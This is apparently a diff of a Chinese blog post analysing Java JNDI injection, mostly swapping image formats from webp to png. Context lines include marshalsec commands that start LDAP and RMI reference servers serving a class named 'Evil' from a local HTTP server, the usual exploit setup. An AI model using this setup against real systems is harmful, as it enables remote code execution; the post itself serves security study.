@@ -7,8 +7,7 @@ lastmod: "2025-12-30T22:07:18+08:00"
 image: ""
 license: ""
 categories: ["Javasec"]
-tags: [""]
-
+tags: ["JNDI"]
 ---
 ## 了解
 
@@ -64,7 +63,7 @@ python3 -m http.server 8000
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPfServer "http://127.0.0.1:8000/#Evil"
 ```
 
-![img](./assets/001.webp)
+![img](./assets/001.png)
 
 debug 看看执行流程
 
@@ -224,7 +223,7 @@ public static Object getFactory(String propName, Hashtable<?,?> env,
 
 获取环境变量或系统属性中定义的包前缀，比如JBOSS 的`"org.jboss.naming:com.sun.jndi.url"`，然后检查缓存，如果有就直接加载类。
 
-![img](./assets/002.webp)
+![img](./assets/002.png)
 
 核心部分，切割包名列表然后拼接包名和类后缀，`com.sun.jndi.url.ldap.ldapURLContextFactory`
 
@@ -598,7 +597,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 
 前面协议转换获取`com.sun.jndi.url.rmi.rmiURLContext`是一样的，然后调用的是`com.sun.jndi.toolkit.url.GenericURLContext.lookup`因为 rmiURLContext 并没有实现 lookup 方法，
 
-![img](./assets/003.webp)
+![img](./assets/003.png)
 
 ```java
 public Object lookup(String var1) throws NamingException {
@@ -694,7 +693,7 @@ public class Test4 {
 }
 ```
 
-![img](./assets/004.webp)
+![img](./assets/004.png)
 除了探测好像并没什么作用，除非 log4j2 那种会解析的服务
 
 ## **原本的模样**
@@ -703,11 +702,11 @@ public class Test4 {
 
 其实两张图就能明确知道
 
-![img](./assets/005.webp)
+![img](./assets/005.png)
 
 rmi 像一个动态服务
 
-![img](./assets/006.webp)
+![img](./assets/006.png)
 
  LDAP 像一个静态目录
 
@@ -744,9 +743,9 @@ https://baozongwi.xyz/p/java-rmi/ 之前我阅读 P 牛的文章写过这样的�
 
 在网上看到两个 demo 来更方便理解 LDAP 这种目录
 
-![img](./assets/007.webp)
+![img](./assets/007.png)
 
-![img](./assets/008.webp)
+![img](./assets/008.png)
 
 很明显我们可以知道这是树状图，那随着公司内部各种开源平台越来越多(例如：gitlab、Jenkins等等)，账号维护变成一个繁琐麻烦的事情，需要有一个统一的账号维护平台，一个人只需一个账号，在公司内部平台通用，而大多数开源平台都支持LDAP，因此只要搭建好LDAP服务，并跟钉钉之类的平台实现账号同步，即可实现统一账号管理。
 
